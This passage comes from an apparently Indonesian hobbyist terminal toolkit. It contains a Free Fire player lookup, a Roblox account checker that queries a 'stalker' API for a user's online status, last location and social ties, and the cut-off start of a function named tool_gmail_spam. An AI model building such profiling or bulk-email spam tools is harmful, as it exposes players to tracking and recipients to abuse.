                    release_version = result.get('release_version', 'Tidak Tersedia')
                    days_old = result.get('days_old', 'Tidak Tersedia')
                    language = result.get('language', 'Tidak Tersedia')
                    rank_show = result.get('rank_show', 'Tidak Tersedia')
                    
                    br_max_rank = result.get('br_max_rank', 'Tidak Tersedia')
                    br_rank_point = result.get('br_rank_point', 'Tidak Tersedia')
                    cs_rank = result.get('cs_rank', 'Tidak Tersedia')
                    cs_max_rank = result.get('cs_max_rank', 'Tidak Tersedia')
                    cs_rank_point = result.get('cs_rank_point', 'Tidak Tersedia')
                    show_br_rank = result.get('show_br_rank', 'Tidak Tersedia')
                    show_cs_rank = result.get('show_cs_rank', 'Tidak Tersedia')
                    
                    equipped_avatar_id = result.get('equipped_avatar_id', 'Tidak Tersedia')
                    equipped_banner_id = result.get('equipped_banner_id', 'Tidak Tersedia')
                    equipped_bp_id = result.get('equipped_bp_id', 'Tidak Tersedia')
                    equipped_bp_badges = result.get('equipped_bp_badges', 'Tidak Tersedia')
                    equipped_outfit = result.get('equipped_outfit', 'Tidak Tersedia')
                    equipped_weapon = result.get('equipped_weapon', 'Tidak Tersedia')
                    
                    avatar_id = result.get('avatar_id', 'Tidak Tersedia')
                    banner_id = result.get('banner_id', 'Tidak Tersedia')
                    pin_id = result.get('pin_id', 'Tidak Tersedia')
                    head_id = result.get('head_id', 'Tidak Tersedia')
                    face_paint_id = result.get('face_paint_id', 'Tidak Tersedia')
                    mask_id = result.get('mask_id', 'Tidak Tersedia')
                    top_id = result.get('top_id', 'Tidak Tersedia')
                    bottom_id = result.get('bottom_id', 'Tidak Tersedia')
                    shoe_id = result.get('shoe_id', 'Tidak Tersedia')
                    badge_id = result.get('badge_id', 'Tidak Tersedia')
                    gender = result.get('gender', 'Tidak Tersedia')
                    
                    last_updated = result.get('last_updated', 'Tidak Tersedia')
                    banner_image = result.get('banner_image', 'Tidak Tersedia')
                    source = result.get('source', 'Tidak Tersedia')
                    from_database = result.get('fromDatabase', 'Tidak Tersedia')
                    
                    print(f"\n{W}╭──────────────────────────────────────────────────────────────────╮")
                    print(f"{W}│ {G}✓{W} Data UID Ditemukan!{N}")
                    print(f"{W}├─────────────────────────────────────────────────────────────────┤")
                    
                    print(f"{W}│{U}BASIC INFO{N}")
                    print(f"{W}│ ├─ UID              {W}: {G}{uid_res}{N}")
                    print(f"{W}│ ├─ Nama             {W}: {G}{name}{N}")
                    print(f"{W}│ ├─ Level            {W}: {G}{level}{N}")
                    print(f"{W}│ ├─ Exp              {W}: {G}{exp}{N}")
                    print(f"{W}│ ├─ Region           {W}: {G}{region}{N}")
                    print(f"{W}│ ├─ Likes            {W}: {G}{likes}{N}")
                    print(f"{W}│ ├─ Prime Level      {W}: {G}{prime_level}{N}")
                    print(f"{W}│ ├─ Honor Score      {W}: {G}{honor_score}{N}")
                    print(f"{W}│ ├─ Celebrity Status {W}: {G}{celebrity_status}{N}")
                    print(f"{W}│ ├─ Title            {W}: {G}{title}{N}")
                    print(f"{W}│ ├─ Bio              {W}: {G}{signature}{N}")
                    print(f"{W}│ ├─ Fire Pass        {W}: {G}{fire_pass}{N}")
                    print(f"{W}│ ├─ BP Badges        {W}: {G}{bp_badges}{N}")
                    print(f"{W}│ ├─ Credit Score     {W}: {G}{credit_score}{N}")
                    print(f"{W}│ ├─ Season ID        {W}: {G}{season_id}{N}")
                    print(f"{W}│ ├─ Account Type     {W}: {G}{account_type}{N}")
                    print(f"{W}│ ├─ Release Version  {W}: {G}{release_version}{N}")
                    print(f"{W}│ ├─ Days Old         {W}: {G}{days_old}{N}")
                    print(f"{W}│ ├─ Language         {W}: {G}{language}{N}")
                    print(f"{W}│ ├─ Rank Show        {W}: {G}{rank_show}{N}")
                    print(f"{W}│ ├─ Dibuat Pada      {W}: {G}{created_at_raw}{N}")
                    print(f"{W}│ ├─ Login Terakhir   {W}: {G}{last_login_raw}{N}")
                    print(f"{W}│ └─ Last Updated     {W}: {G}{last_updated}{N}")
                    
                    print(f"{W}│{U}RANK INFO{N}")
                    print(f"{W}│ ├─ BR Rank          {W}: {G}{br_rank}{N}")
                    print(f"{W}│ ├─ BR Max Rank      {W}: {G}{br_max_rank}{N}")
                    print(f"{W}│ ├─ BR Rank Point    {W}: {G}{br_rank_point}{N}")
                    print(f"{W}│ ├─ CS Rank          {W}: {G}{cs_rank}{N}")
                    print(f"{W}│ ├─ CS Max Rank      {W}: {G}{cs_max_rank}{N}")
                    print(f"{W}│ ├─ CS Rank Point    {W}: {G}{cs_rank_point}{N}")
                    print(f"{W}│ ├─ CS Points        {W}: {G}{cs_points}{N}")
                    print(f"{W}│ ├─ Show BR Rank     {W}: {G}{show_br_rank}{N}")
                    print(f"{W}│ └─ Show CS Rank     {W}: {G}{show_cs_rank}{N}")
                    
                    print(f"{W}│{U}EQUIPPED ITEMS{N}")
                    print(f"{W}│ ├─ Avatar ID        {W}: {G}{equipped_avatar_id}{N}")
                    print(f"{W}│ ├─ Banner ID        {W}: {G}{equipped_banner_id}{N}")
                    print(f"{W}│ ├─ BP ID            {W}: {G}{equipped_bp_id}{N}")
                    print(f"{W}│ ├─ BP Badges        {W}: {G}{equipped_bp_badges}{N}")
                    print(f"{W}│ ├─ Outfit           {W}: {G}{equipped_outfit}{N}")
                    print(f"{W}│ ├─ Weapon           {W}: {G}{equipped_weapon}{N}")
                    print(f"{W}│ ├─ Skills           {W}: {G}{equipped_skills}{N}")
                    print(f"{W}│ ├─ Gun ID           {W}: {G}{equipped_gun_id}{N}")
                    print(f"{W}│ ├─ Animation ID     {W}: {G}{equipped_animation_id}{N}")
                    print(f"{W}│ └─ Transform Anim   {W}: {G}{transform_animation_id}{N}")
                    
                    print(f"{W}│{U}PET INFO{N}")
                    print(f"{W}│ ├─ Pet Equipped     {W}: {G}{pet_equipped}{N}")
                    print(f"{W}│ ├─ Pet ID           {W}: {G}{pet_id}{N}")
                    print(f"{W}│ ├─ Pet Name         {W}: {G}{pet_name}{N}")
                    print(f"{W}│ ├─ Pet Level        {W}: {G}{pet_level}{N}")
                    print(f"{W}│ ├─ Pet Exp          {W}: {G}{pet_exp}{N}")
                    print(f"{W}│ ├─ Is Selected      {W}: {G}{pet_is_selected}{N}")
                    print(f"{W}│ ├─ Selected Skill   {W}: {G}{pet_selected_skill_id}{N}")
                    print(f"{W}│ └─ Skin ID          {W}: {G}{pet_skin_id}{N}")
                    
                    print(f"{W}│{U}GUILD INFO{N}")
                    print(f"{W}│ ├─ Guild Name       {W}: {G}{guild_name}{N}")
                    print(f"{W}│ ├─ Guild ID         {W}: {G}{guild_id}{N}")
                    print(f"{W}│ ├─ Guild Level      {W}: {G}{guild_level}{N}")
                    print(f"{W}│ ├─ Guild Members    {W}: {G}{guild_members}{N}")
                    print(f"{W}│ ├─ Member Count     {W}: {G}{guild_member}{N}")
                    print(f"{W}│ ├─ Capacity         {W}: {G}{guild_capacity}{N}")
                    print(f"{W}│ └─ Owner ID         {W}: {G}{guild_owner_id}{N}")
                    
                    print(f"{W}│{U}GUILD LEADER{N}")
                    print(f"{W}│ ├─ Nama             {W}: {G}{guild_leader_name}{N}")
                    print(f"{W}│ ├─ UID              {W}: {G}{guild_leader_uid}{N}")
                    print(f"{W}│ ├─ Level            {W}: {G}{guild_leader_level}{N}")
                    print(f"{W}│ ├─ Exp              {W}: {G}{guild_leader_exp}{N}")
                    print(f"{W}│ ├─ Likes            {W}: {G}{guild_leader_likes}{N}")
                    print(f"{W}│ ├─ BR Rank          {W}: {G}{guild_leader_br_rank}{N}")
                    print(f"{W}│ ├─ BR Max Rank      {W}: {G}{guild_leader_br_max_rank}{N}")
                    print(f"{W}│ ├─ BR Points        {W}: {G}{guild_leader_br_points}{N}")
                    print(f"{W}│ ├─ CS Rank          {W}: {G}{guild_leader_cs_rank}{N}")
                    print(f"{W}│ ├─ CS Max Rank      {W}: {G}{guild_leader_cs_max_rank}{N}")
                    print(f"{W}│ ├─ CS Points        {W}: {G}{guild_leader_cs_points}{N}")
                    print(f"{W}│ ├─ Badge ID         {W}: {G}{guild_leader_badge_id}{N}")
                    print(f"{W}│ ├─ Banner ID        {W}: {G}{guild_leader_banner_id}{N}")
                    print(f"{W}│ ├─ Avatar ID        {W}: {G}{guild_leader_avatar_id}{N}")
                    print(f"{W}│ ├─ Pin ID           {W}: {G}{guild_leader_pin_id}{N}")
                    print(f"{W}│ ├─ Region           {W}: {G}{guild_leader_region}{N}")
                    print(f"{W}│ ├─ Season ID        {W}: {G}{guild_leader_season_id}{N}")
                    print(f"{W}│ ├─ Release Version  {W}: {G}{guild_leader_release_version}{N}")
                    print(f"{W}│ ├─ Has Elite Pass   {W}: {G}{guild_leader_has_elite_pass}{N}")
                    print(f"{W}│ ├─ Weapon Skins     {W}: {G}{guild_leader_weapon_skins}{N}")
                    print(f"{W}│ ├─ BP Badges        {W}: {G}{guild_leader_bp_badges}{N}")
                    print(f"{W}│ ├─ Title            {W}: {G}{guild_leader_title}{N}")
                    print(f"{W}│ ├─ Dibuat Pada      {W}: {G}{guild_leader_created_at}{N}")
                    print(f"{W}│ └─ Login Terakhir   {W}: {G}{guild_leader_last_login}{N}")
                    
                    print(f"{W}│{U}OTHER INFO{N}")
                    print(f"{W}│ ├─ Avatar ID        {W}: {G}{avatar_id}{N}")
                    print(f"{W}│ ├─ Banner ID        {W}: {G}{banner_id}{N}")
                    print(f"{W}│ ├─ Pin ID           {W}: {G}{pin_id}{N}")
                    print(f"{W}│ ├─ Head ID          {W}: {G}{head_id}{N}")
                    print(f"{W}│ ├─ Face Paint ID    {W}: {G}{face_paint_id}{N}")
                    print(f"{W}│ ├─ Mask ID          {W}: {G}{mask_id}{N}")
                    print(f"{W}│ ├─ Top ID           {W}: {G}{top_id}{N}")
                    print(f"{W}│ ├─ Bottom ID        {W}: {G}{bottom_id}{N}")
                    print(f"{W}│ ├─ Shoe ID          {W}: {G}{shoe_id}{N}")
                    print(f"{W}│ ├─ Badge ID         {W}: {G}{badge_id}{N}")
                    print(f"{W}│ ├─ Gender           {W}: {G}{gender}{N}")
                    print(f"{W}│ ├─ Banner Image     {W}: {G}{banner_image}{N}")
                    print(f"{W}│ ├─ Source           {W}: {G}{source}{N}")
                    print(f"{W}│ └─ From Database    {W}: {G}{from_database}{N}")
                    
                    print(f"{W}╰──────────────────────────────────────────────────────────────────╯")
                    
            except json.JSONDecodeError:
                print(f"\n{W}╭─────────────────────────────────────────────────────────────╮")
                print(f"{W}│ {R}✗{W} Respon server tidak valid (UID mungkin salah){N}")
                print(f"{W}╰─────────────────────────────────────────────────────────────╯")
        else:
            print(f"\n{W}╭─────────────────────────────────────────────────────────────╮")
            print(f"{W}│ {R}✗{W} Gagal mengambil data! Status: {response.status_code}{N}")
            print(f"{W}╰─────────────────────────────────────────────────────────────╯")
            
    except requests.exceptions.Timeout:
        stop_loading.set()
        loading_thread.join()
        print(f"\n{R}✗ Timeout! Server tidak merespons.{N}")
    except requests.exceptions.ConnectionError:
        stop_loading.set()
        loading_thread.join()
        print(f"\n{R}✗ Gagal terhubung ke server!{N}")
    except Exception as e:
        stop_loading.set()
        loading_thread.join()
        print(f"\n{R}✗ Error: {e}{N}")
    
    input(f"\n{U}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")
    
def tool_roblox_checker():
    play_menu_sound()
    pantau_aktivitas()
    import os, sys, time, json, requests, threading
    
    os.system('clear')
    
    R = '\033[91m'
    G = '\033[92m'
    W = '\033[97m'
    N = '\033[0m'
    U = '\033[95m'
    
    ascii_roblox = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣷⣶⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣤⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣤⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠻⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠉⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⣀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣦⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠛⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠻⠿⢿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"""
    os.system(f'echo "{ascii_roblox}" | lolcat 2>/dev/null || echo "{ascii_roblox}"')
    
    print(f"""
{W}╭─────────────────────────────────────────────────────────────────╮
{W}│ {W}Developer {W}:{G} Rullzzz06,{W} Tools {W}:{G}Roblox Checker
{W}╰─────────────────────────────────────────────────────────────────╯{N}""")
    print(f"{W}╭───────────────────────────────────────────────────────────────────╮{N}")
    print(f"{W}│ Masukkan {G}Username{W} atau {G}User ID{W} Roblox{N}")
    print(f"{W}│ Contoh {G}:{W} Builderman  atau  7676034212{N}")
    print(f"{W}╰───────────────────────────────────────────────────────────────────╯{N}")
    
    username = input(f"{U}❯❯❯ {W}Masukkan uid {R}/{W} Username Roblox {G}❯{N} ").strip()
    
    if not username:
        print(f"\n{R}✗ Username tidak boleh kosong!{N}")
        input(f"\n{W}Tekan Enter untuk kembali...{N}")
        return
    
    def load_bar(stop_event):
        COLORS = ['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m']
        RESET = '\x1b[0m'
        length = 15
        color_index = 0
        while not stop_event.is_set():
            for i in range(length + 1):
                if stop_event.is_set():
                    break
                filled_color = COLORS[color_index % len(COLORS)] + '■' * i + RESET
                empty = '□' * (length - i)
                sys.stdout.write(f'\r [ {G}✦{W} ] Mengecek Akun Roblox [[{filled_color}{empty}{W}]]')
                sys.stdout.flush()
                time.sleep(0.05)
                color_index += 1
        sys.stdout.write('\r' + ' ' * 120 + '\r')
        sys.stdout.flush()
    
    stop_loading = threading.Event()
    loading_thread = threading.Thread(target=load_bar, args=(stop_loading,))
    loading_thread.daemon = True
    loading_thread.start()
    
    time.sleep(1.5)
    
    try:
        url = f"https://api.nexray.eu.cc/stalker/roblox?username={username}"
        headers = {
            'accept': 'application/json',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'
        }
        
        response = requests.get(url, headers=headers, timeout=15)
        stop_loading.set()
        loading_thread.join()
        
        if response.status_code == 200:
            data = response.json()
            
            if data.get('status') == True:
                result = data.get('result')
                if result is None:
                    print(f"\n{W}╭───────────────────────────────────────────────────────────────╮")
                    print(f"{W}│ {R}✗{W} Data result kosong!{N}")
                    print(f"{W}╰───────────────────────────────────────────────────────────────╯")
                    input(f"\n{W}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")
                    return
                
                user_id = result.get('userId') if result else 'Tidak Diketahui'
                
                basic = result.get('basic') if result else None
                if basic is None:
                    basic = {}
                name = basic.get('name', 'Tidak Diketahui') if basic else 'Tidak Diketahui'
                display_name = basic.get('displayName', 'Tidak Diketahui') if basic else 'Tidak Diketahui'
                description = basic.get('description', 'Kosong') if basic else 'Kosong'
                created = basic.get('created', 'Tidak Diketahui') if basic else 'Tidak Diketahui'
                is_banned = basic.get('isBanned', False) if basic else False
                has_verified = basic.get('hasVerifiedBadge', False) if basic else False
                external_app = basic.get('externalAppDisplayName') if basic else None
                
                presence = result.get('presence') if result else None
                if presence is None:
                    presence = {}
                presence_list = presence.get('userPresences') if presence else None
                if presence_list and len(presence_list) > 0:
                    p = presence_list[0] if presence_list[0] else {}
                    status_text = "Online" if p.get('userPresenceType') == 1 else "Offline"
                    last_location = p.get('lastLocation', 'Tidak Diketahui')
                    place_id = p.get('placeId')
                    game_id = p.get('gameId')
                    universe_id = p.get('universeId')
                else:
                    status_text = "Tidak Diketahui"
                    last_location = "Tidak Diketahui"
                    place_id = None
                    game_id = None
                    universe_id = None
                
                social = result.get('social') if result else None
                if social is None:
                    social = {}
                friends = social.get('friends', {}).get('count', 0) if social else 0
                followers = social.get('followers', {}).get('count', 0) if social else 0
                following = social.get('following', {}).get('count', 0) if social else 0
                
                groups = result.get('groups') if result else None
                if groups is None:
                    groups = {}
                groups_list = groups.get('list', {}).get('data') if groups else None
                if groups_list is None:
                    groups_list = []
                group_count = len(groups_list)
                
                achievements = result.get('achievements') if result else None
                if achievements is None:
                    achievements = {}
                roblox_badges = achievements.get('robloxBadges') if achievements else None
                if roblox_badges is None:
                    roblox_badges = []
                badge_count = len(roblox_badges)
                
                avatar = result.get('avatar') if result else None
                if avatar is None:
                    avatar = {}
                avatar_url = "Tidak Tersedia"
                avatar_data = avatar.get('headshot', {}).get('data') if avatar else None
                if avatar_data and len(avatar_data) > 0:
                    avatar_url = avatar_data[0].get('imageUrl', 'Tidak Tersedia') if avatar_data[0] else 'Tidak Tersedia'
                
                fullbody_url = "Tidak Tersedia"
                fullbody_data = avatar.get('fullBody', {}).get('data') if avatar else None
                if fullbody_data and len(fullbody_data) > 0:
                    fullbody_url = fullbody_data[0].get('imageUrl', 'Tidak Tersedia') if fullbody_data[0] else 'Tidak Tersedia'
                
                bust_url = "Tidak Tersedia"
                bust_data = avatar.get('bust', {}).get('data') if avatar else None
                if bust_data and len(bust_data) > 0:
                    bust_url = bust_data[0].get('imageUrl', 'Tidak Tersedia') if bust_data[0] else 'Tidak Tersedia'
                
                details = avatar.get('details') if avatar else None
                if details is None:
                    details = {}
                player_avatar_type = details.get('playerAvatarType', 'Tidak Diketahui') if details else 'Tidak Diketahui'
                assets = details.get('assets') if details else None
                if assets is None:
                    assets = []
                asset_count = len(assets)
                emotes = details.get('emotes') if details else None
                if emotes is None:
                    emotes = []
                emote_count = len(emotes)
                wearing = details.get('wearing') if details else None
                if wearing is None:
                    wearing = {}
                wearing_ids = wearing.get('assetIds') if wearing else None
                if wearing_ids is None:
                    wearing_ids = []
                wearing_count = len(wearing_ids)
                
                outfits = avatar.get('outfits') if avatar else None
                if outfits is None:
                    outfits = {}
                outfits_list = outfits.get('data') if outfits else None
                if outfits_list is None:
                    outfits_list = []
                outfit_total = outfits.get('total', 0) if outfits else 0
                
                catalog = result.get('catalog') if result else None
                if catalog is None:
                    catalog = {}
                bundles = catalog.get('bundles') if catalog else None
                if bundles is None:
                    bundles = {}
                bundles_list = bundles.get('data') if bundles else None
                if bundles_list is None:
                    bundles_list = []
                bundle_count = len(bundles_list)
                
                created_formatted = created.replace('T', ' ').replace('Z', '') if created != 'Tidak Diketahui' else 'Tidak Diketahui'
                
                group_names = []
                if groups_list:
                    for g in groups_list:
                        if g and g.get('group'):
                            group_names.append(g.get('group', {}).get('name', 'Unknown'))
                
                badge_names = []
                if roblox_badges:
                    for b in roblox_badges:
                        if b:
                            badge_names.append(b.get('name', 'Unknown'))
                
                asset_names = []
                if assets:
                    for a in assets:
                        if a:
                            asset_names.append(a.get('name', 'Unknown'))
                
                emote_names = []
                if emotes:
                    for e in emotes:
                        if e:
                            emote_names.append(e.get('assetName', 'Unknown'))
                
                outfit_names = []
                if outfits_list:
                    for o in outfits_list:
                        if o:
                            outfit_names.append(o.get('name', 'Unknown'))
                
                bundle_names = []
                if bundles_list:
                    for b in bundles_list:
                        if b:
                            bundle_names.append(b.get('name', 'Unknown'))
                
                print(f"\n{W}╭────────────────────────────────────────────────────────────────────────╮")
                print(f"{W}│ {G}✓{W} Akun Roblox Ditemukan!{N}")
                print(f"{W}├────────────────────────────────────────────────────────────────────────┤")
                print(f"{W}│ {W}ID Akun              {R}: {G}{user_id}{N}")
                print(f"{W}│ {W}Username             {R}: {G}{name}{N}")
                print(f"{W}│ {W}Nama Tampilan        {R}: {G}{display_name}{N}")
                if external_app:
                    print(f"{W}│ {W}Nama Aplikasi Eksternal{R}: {G}{external_app}{N}")
                print(f"{W}│ {W}Status Verifikasi    {R}: {G}{'Ya' if has_verified else 'Tidak'}{N}")
                print(f"{W}│ {W}Status Banned        {R}: {G}{'Ya' if is_banned else 'Tidak'}{N}")
                print(f"{W}├────────────────────────────────────────────────────────────────────────┤")
                print(f"{W}│ {W}Status Online        {R}: {G}{status_text}{N}")
                print(f"{W}│ {W}Lokasi Terakhir      {R}: {G}{last_location}{N}")
                if place_id:
                    print(f"{W}│ {W}Place ID             {R}: {G}{place_id}{N}")
                if game_id:
                    print(f"{W}│ {W}Game ID              {R}: {G}{game_id}{N}")
                if universe_id:
                    print(f"{W}│ {W}Universe ID          {R}: {G}{universe_id}{N}")
                print(f"{W}├────────────────────────────────────────────────────────────────────────┤")
                print(f"{W}│ {W}Jumlah Teman         {R}: {G}{friends}{N}")
                print(f"{W}│ {W}Jumlah Pengikut      {R}: {G}{followers}{N}")
                print(f"{W}│ {W}Mengikuti            {R}: {G}{following}{N}")
                print(f"{W}├────────────────────────────────────────────────────────────────────────┤")
                print(f"{W}│ {W}Jumlah Grup          {R}: {G}{group_count}{N}")
                if group_names:
                    print(f"{W}│ {W}Nama Grup            {R}: {G}{', '.join(group_names[:10])}{'...' if len(group_names) > 10 else ''}{N}")
                print(f"{W}├────────────────────────────────────────────────────────────────────────┤")
                print(f"{W}│ {W}Jumlah Badge         {R}: {G}{badge_count}{N}")
                if badge_names:
                    print(f"{W}│ {W}Nama Badge           {R}: {G}{', '.join(badge_names)}{N}")
                print(f"{W}├────────────────────────────────────────────────────────────────────────┤")
                print(f"{W}│ {W}Tanggal Bergabung    {R}: {G}{created_formatted}{N}")
                print(f"{W}│ {W}Bio Akun             {R}: {G}{description}{N}")
                print(f"{W}├────────────────────────────────────────────────────────────────────────┤")
                print(f"{W}│ {W}Jumlah Asset         {R}: {G}{asset_count}{N}")
                if asset_names:
                    print(f"{W}│ {W}Nama Asset           {R}: {G}{', '.join(asset_names)}{N}")
                print(f"{W}│ {W}Jumlah Emote         {R}: {G}{emote_count}{N}")
                if emote_names:
                    print(f"{W}│ {W}Nama Emote           {R}: {G}{', '.join(emote_names)}{N}")
                print(f"{W}│ {W}Jumlah Item Dipakai  {R}: {G}{wearing_count}{N}")
                print(f"{W}│ {W}Tipe Avatar          {R}: {G}{player_avatar_type}{N}")
                print(f"{W}├────────────────────────────────────────────────────────────────────────┤")
                print(f"{W}│ {W}Jumlah Outfit        {R}: {G}{outfit_total}{N}")
                if outfit_names:
                    print(f"{W}│ {W}Nama Outfit          {R}: {G}{', '.join(outfit_names[:10])}{'...' if len(outfit_names) > 10 else ''}{N}")
                print(f"{W}├────────────────────────────────────────────────────────────────────────┤")
                print(f"{W}│ {W}Jumlah Bundle        {R}: {G}{bundle_count}{N}")
                if bundle_names:
                    print(f"{W}│ {W}Nama Bundle          {R}: {G}{', '.join(bundle_names)}{N}")
                print(f"{W}├────────────────────────────────────────────────────────────────────────┤")
                print(f"{W}│ {W}Avatar Headshot      {R}: {G}{avatar_url}{N}")
                print(f"{W}│ {W}Avatar Full Body     {R}: {G}{fullbody_url}{N}")
                if bust_url != "Tidak Tersedia":
                    print(f"{W}│ {W}Avatar Bust          {R}: {G}{bust_url}{N}")
                print(f"{W}╰────────────────────────────────────────────────────────────────────────╯")
                
            else:
                print(f"\n{W}╭────────────────────────────────────────────────────────────────────╮")
                print(f"{W}│ {R}✗{W} Username {R}{username}{W} tidak ditemukan!{N}")
                print(f"{W}╰────────────────────────────────────────────────────────────────────╯")
        else:
            print(f"\n{W}╭──────────────────────────────────────────────────────────────────╮")
            print(f"{W}│ {R}✗{W} Gagal mengambil data! Status: {response.status_code}{N}")
            print(f"{W}╰──────────────────────────────────────────────────────────────────╯")
            
    except requests.exceptions.Timeout:
        stop_loading.set()
        loading_thread.join()
        print(f"\n{R}✗ Timeout! Server tidak merespons.{N}")
    except requests.exceptions.ConnectionError:
        stop_loading.set()
        loading_thread.join()
        print(f"\n{R}✗ Gagal terhubung ke server!{N}")
    except Exception as e:
        stop_loading.set()
        loading_thread.join()
        print(f"\n{R}✗ Error: {e}{N}")
    
    input(f"\n{W}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")

def tool_gmail_spam():
    play_menu_sound()
    pantau_aktivitas()
    import os, sys, time, json, requests, threading, random, smtplib
    from email.mime.text import MIMEText
    from email.mime.multipart import MIMEMultipart
    from concurrent.futures import ThreadPoolExecutor, as_completed
    import re

    os.system('clear')

    ascii_gmail = """
⠀⠀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡄⠀⠀
⠀⢺⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠆⠀
